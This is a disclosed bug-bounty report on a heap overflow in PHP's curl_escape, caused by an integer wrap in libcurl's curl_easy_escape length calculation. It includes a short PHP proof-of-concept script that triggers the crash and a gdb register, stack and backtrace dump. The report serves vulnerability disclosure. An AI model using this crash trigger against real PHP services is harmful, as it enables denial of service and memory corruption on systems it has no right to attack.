# Heap overflow in curl_escape

## Report Details
- **Report ID**: 160295
- **URL**: https://hackerone.com/reports/160295
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-18T01:07:53.789Z
- **Disclosed**: 2019-11-12T09:31:33.048Z

## Reporter
- **Username**: hoangnguyen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
I have founded a code block that leads to heap overflow. As you can see at :
```
PHP_FUNCTION(curl_escape)
{
        char       *str = NULL, *res = NULL;
        size_t        str_len = 0;
        zval       *zid;
        php_curl   *ch;
        *** SNIP ***
        if ((res = curl_easy_escape(ch->cp, str, str_len))) {
                RETVAL_STRING(res);
                curl_free(res);
        } else {
                RETURN_FALSE;
        }
        *** SNIP ***
}
```
I do some analysis with curl_easy_escape in libcurl and here the source code :
```
char *curl_easy_escape(CURL *handle, const char *string, int inlength)
{
        size_t alloc = (inlength?(size_t)inlength:strlen(string))+1;
        char *ns;
        char *testing_ptr = NULL;
        
        *** SNIP ***
        
        ns = malloc(alloc);
        if(!ns)
            return NULL;

        length = alloc-1;
        while(length--) {
            in = *string;
            if (Curl_isalnum(in)) {
            /* just copy this */
                ns[strindex++]=in;
        *** SNIP ***
```
Here you see that alloc is calculated by adding inlength with one. If we pass a string with length 0xfffffff in curl_escape
and the alloc add it with 1 and the result of alloc is 0. After that, the malloc a buffer with size 0 and length = 0 - 1 = -1 = 0xfffffff
this leads to heap overflow

Test script:
---------------
<?php

ini_set('memory_limit',-1);

$ch = curl_init('http://google.com');
curl_escape($ch,str_repeat("A",0xffffffff));

?>
```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7ffff67ce508 (<curl_easy_escape+120>:    mov    BYTE PTR [r14+r13*1],cl)
RBX: 0x0 
RCX: 0x41 ('A')
RDX: 0x14 
RSI: 0x7ffff67a2b20 --> 0x100000000 
RDI: 0x0 
RBP: 0x7ffff67ff8ec --> 0xfffcec1cfffcec1c 
RSP: 0x7fffffffa720 --> 0x148fd80 ('A' <repeats 200 times>...)
RIP: 0x7ffff67ce508 (<curl_easy_escape+120>:    mov    BYTE PTR [r14+r13*1],cl)
R8 : 0x7fffffffa5b8 --> 0x0 
R9 : 0x7fffffffa5b4 --> 0x0 
R10: 0x14773e0 --> 0x79746974 ('tity')
R11: 0x7ffff67ce490 (<curl_easy_escape>:        push   r15)
R12: 0x0 
R13: 0x38c10 
R14: 0x14773f0 ('A' <repeats 200 times>...)
R15: 0x7ffeef038c28 ('A' <repeats 200 times>...)
EFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff67ce4fc <curl_easy_escape+108>:       add    rax,rbp
   0x7ffff67ce4ff <curl_easy_escape+111>:       jmp    rax
   0x7ffff67ce501 <curl_easy_escape+113>:       nop    DWORD PTR [rax+0x0]
=> 0x7ffff67ce508 <curl_easy_escape+120>:       mov    BYTE PTR [r14+r13*1],cl
   0x7ffff67ce50c <curl_easy_escape+124>:       add    r13,0x1
   0x7ffff67ce510 <curl_easy_escape+128>:       mov    rax,QWORD PTR [rsp+0x10]
   0x7ffff67ce515 <curl_easy_escape+133>:       add    r15,0x1
   0x7ffff67ce519 <curl_easy_escape+137>:       sub    rax,r15
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffa720 --> 0x148fd80 ('A' <repeats 200 times>...)
0008| 0x7fffffffa728 --> 0x7ffeef000018 ('A' <repeats 200 times>...)
0016| 0x7fffffffa730 --> 0xffffffffffffffff 
0024| 0x7fffffffa738 --> 0x7ffeef000018 ('A' <repeats 200 times>...)
0032| 0x7fffffffa740 --> 0x148fd80 ('A' <repeats 200 times>...)
0040| 0x7fffffffa748 --> 0x0 
0048| 0x7fffffffa750 --> 0x7fffffffa7e0 --> 0x7fffffffa810 --> 0x7fffffffa840 --> 0x7fffffffa880 --> 0x7fffffffa990 --> 0x7fffffffcc90 --> 0x7fffffffe010 --> 0x7fffffffe160 --> 0xa28260 (<__libc_csu_init>:        push   r15)
0056| 0x7fffffffa758 --> 0x42cb20 (<_start>:    xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ffff67ce508 in curl_easy_escape () from /usr/lib/x86_64-linux-gnu/libcurl.so.4
gdb-peda$ bt
#0  0x00007ffff67ce508 in curl_easy_escape () from /usr/lib/x86_64-linux-gnu/libcurl.so.4
#1  0x00000000005ff72c in zif_curl_escape (execute_data=0x7fffef614110, return_value=0x7fffef614100)
    at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/curl/interface.c:3571
```
Bug here : https://bugs.php.net/bug.php?id=72674

## Attachments
No attachments
